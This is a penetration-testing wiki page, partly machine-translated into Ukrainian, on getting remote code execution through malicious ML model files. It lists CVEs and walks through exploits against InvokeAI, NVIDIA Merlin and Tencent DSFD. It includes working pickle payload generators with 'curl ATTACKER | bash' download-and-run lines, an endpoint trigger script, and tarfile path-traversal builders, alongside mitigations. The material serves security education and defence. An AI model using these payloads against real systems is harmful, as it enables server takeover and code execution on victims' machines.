# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Loading models to RCE

Machine Learning models are usually shared in different formats, such as ONNX, TensorFlow, PyTorch, etc. These models can be loaded into developers machines or production systems to use them. Usually the models sholdn't contain malicious code, but there are some cases where the model can be used to execute arbitrary code on the system as intended feature or because of a vulnerability in the model loading library.

At the time of the writting these are some examples of this type of vulneravilities:

| **Фреймворк / Інструмент** | **Уразливість (CVE, якщо доступно)**                                                    | **RCE Vector**                                                                                                                           | **Посилання**                                |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Шкідливий pickle у контрольній точці моделі призводить до виконання коду (обхід захисту `weights_only`)                                    | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download призводять до виконання коду; Java deserialization RCE в management API                                    | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Неперевірена контрольна точка спричиняє виклик pickle reducer під час `load_model_trainer_states_from_checkpoint` → виконання коду в ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Завантаження моделі з YAML використовує `yaml.unsafe_load` (виконання коду) <br> Завантаження моделі з шаром **Lambda** виконує довільний Python-код          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Сконструйована модель `.tflite` викликає integer overflow → heap corruption (можливий RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Завантаження моделі через `joblib.load` виконує pickle з payload `__reduce__` атакуючого                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | За замовчуванням `numpy.load` дозволяє pickled object arrays – шкідливий `.npy/.npz` викликає виконання коду                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Шлях external-weights моделі ONNX може вийти за межі директорії (читання довільних файлів) <br> Шкідливий ONNX model tar може перезаписати довільні файли (що призводить до RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Модель з custom operator вимагає завантаження нативного коду атакуючого; складні графи моделі можуть зловживати логікою для виконання небажаних обчислень   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Використання model-load API з увімкненим `--model-control` дозволяє відносний path traversal для запису файлів (наприклад, перезаписати `.bashrc` для RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Спотворений файл моделі GGUF спричиняє переповнення буфера у парсері, дозволяючи виконання довільного коду на системі жертви                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Шкідлива HDF5 (`.h5`) модель з кодом у шарі Lambda все ще виконується при завантаженні (Keras safe_mode не покриває старий формат – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Багато ML-інструментів (наприклад, формати моделей на базі pickle, Python `pickle.load`) виконуватимуть довільний код, вбудований у файли моделей, якщо не застосовано заходи пом'якшення | |

Moreover, there some python pickle based models like the ones used by [PyTorch](https://github.com/pytorch/pytorch/security) that can be used to execute arbitrary code on the system if they are not loaded with `weights_only=True`. So, any pickle based model might be specially susceptible to this type of attacks, even if they are not listed in the table above.

### 🆕  InvokeAI RCE через `torch.load` (CVE-2024-12029)

`InvokeAI` is a popular open-source web interface for Stable-Diffusion. Versions **5.3.1 – 5.4.2** expose the REST endpoint `/api/v2/models/install` that lets users download and load models from arbitrary URLs.

Internally the endpoint eventually calls:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
When the supplied file is a **PyTorch checkpoint (`*.ckpt`)**, `torch.load` performs a **pickle deserialization**.  Оскільки вміст надходить безпосередньо з URL, контрольованого користувачем, атакуючий може вбудувати шкідливий об'єкт з власним методом `__reduce__` всередину checkpoint; цей метод виконується **during deserialization**, що призводить до **remote code execution (RCE)** на сервері InvokeAI.

Цій уразливості присвоєно **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Exploitation walk-through

1. Створіть шкідливий checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Розмістіть `payload.ckpt` на HTTP-сервері, яким ви керуєте (наприклад, `http://ATTACKER/payload.ckpt`).
3. Спровокуйте вразливий endpoint (аутентифікація не потрібна):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Коли InvokeAI завантажує файл, він викликає `torch.load()` → гаджет `os.system` запускається, і нападник отримує виконання коду в контексті процесу InvokeAI.

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` автоматизує весь процес.

#### Умови

•  InvokeAI 5.3.1-5.4.2 (прапорець scan за замовчуванням **false**)  
•  `/api/v2/models/install` доступний для нападника  
•  Процес має дозволи на виконання shell команд

#### Міри пом'якшення

* Оновіть до **InvokeAI ≥ 5.4.3** – патч встановлює `scan=True` за замовчуванням і виконує сканування на наявність шкідливого ПЗ перед десеріалізацією.  
* При програмному завантаженні чекпойнтів використовуйте `torch.load(file, weights_only=True)` або новий [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper.  
* Впровадьте allow-lists / підписи для джерел моделей і запускайте сервіс з найменшими привілеями.

> ⚠️ Пам'ятайте, що **будь-який** Python pickle-based формат (включно з багатьма `.pt`, `.pkl`, `.ckpt`, `.pth` файлами) за своєю природою небезпечний для десеріалізації з ненадійних джерел.

---

Приклад ад-хок заходу, якщо потрібно тримати старі версії InvokeAI за reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE через небезпечний виклик `torch.load` (CVE-2025-23298)

Transformers4Rec від NVIDIA (частина Merlin) мав небезпечний checkpoint loader, який безпосередньо викликав `torch.load()` для шляхів, наданих користувачем. Оскільки `torch.load` покладається на Python `pickle`, контрольований атакуючим checkpoint може виконати довільний код через reducer під час десеріалізації.

Уразливий шлях (до фіксу): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Чому це призводить до RCE: у Python `pickle` об'єкт може визначати reducer (`__reduce__`/`__setstate__`), який повертає callable та аргументи. Цей callable виконується під час розпакування (unpickling). Якщо такий об'єкт присутній у checkpoint, він виконається до того, як будуть використані будь-які ваги.

Мінімальний приклад шкідливого checkpoint:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Delivery vectors and blast radius:
- Trojanized checkpoints/models shared via repos, buckets, or artifact registries
- Automated resume/deploy pipelines that auto-load checkpoints
- Execution happens inside training/inference workers, often with elevated privileges (e.g., root in containers)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) replaced the direct `torch.load()` with a restricted, allow-listed deserializer implemented in `transformers4rec/utils/serialization.py`. The new loader validates types/fields and prevents arbitrary callables from being invoked during load.

Захисні рекомендації, специфічні для PyTorch checkpoints:
- Не виконувати unpickle ненадійних даних. Віддавайте перевагу невиконуваним форматам, таким як [Safetensors](https://huggingface.co/docs/safetensors/index) або ONNX, коли це можливо.
- Якщо ви змушені використовувати серіалізацію PyTorch, переконайтеся, що `weights_only=True` (підтримується в новіших версіях PyTorch) або використовуйте кастомний unpickler зі списком дозволених типів, подібний до патчу Transformers4Rec.
- Забезпечуйте provenance/signatures моделі та виконання десеріалізації в sandbox (seccomp/AppArmor; non-root user; обмежена FS та відсутність мережевого egress).
- Моніторте наявність несподіваних дочірніх процесів від ML-сервісів під час завантаження checkpoints; трасуйте використання `torch.load()`/`pickle`.

POC and vulnerable/patch references:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Приклад – створення шкідливої PyTorch-моделі

- Create the model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Завантажити модель:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Десеріалізація Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent’s FaceDetection-DSFD відкриває endpoint `resnet`, який десеріалізує дані, контрольовані користувачем. ZDI підтвердили, що віддалений атакувач може змусити жертву завантажити шкідливу сторінку/файл, змусити її надіслати спеціально створений серіалізований blob на цей endpoint і спровокувати десеріалізацію від імені `root`, що призводить до повної компрометації.

Хід експлойту відповідає типовому зловживанню pickle:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Будь-який gadget, доступний під час deserialization (constructors, `__setstate__`, framework callbacks тощо), може бути зловмисно використаний тим самим чином, незалежно від того, чи транспорт був HTTP, WebSocket або файл, скинутий у watched directory.


## Models to Path Traversal

Як зазначено в [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), більшість форматів моделей, що використовуються різними AI frameworks, базуються на архівах, зазвичай `.zip`. Тому можливо зловживати цими форматами для виконання path traversal attacks, що дозволяє читати довільні файли з системи, де модель завантажується.

Наприклад, за допомогою наведеного нижче коду ви можете створити модель, яка при завантаженні створить файл у директорії `/tmp`:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Або, за допомогою наступного коду ви можете створити модель, яка при завантаженні створить symlink, що вказуватиме на директорію `/tmp`:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Детальний огляд: Keras .keras deserialization and gadget hunting

Для цільового посібника щодо внутрішньої структури .keras, Lambda-layer RCE, проблеми arbitrary import у ≤ 3.8 та виявлення post-fix gadget всередині allowlist дивіться:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Посилання

- [Блог OffSec – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Документація модуля Rapid7 Metasploit](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [Блог ZDI – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [Оповіщення ZDI: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)

{{#include ../banners/hacktricks-training.md}}
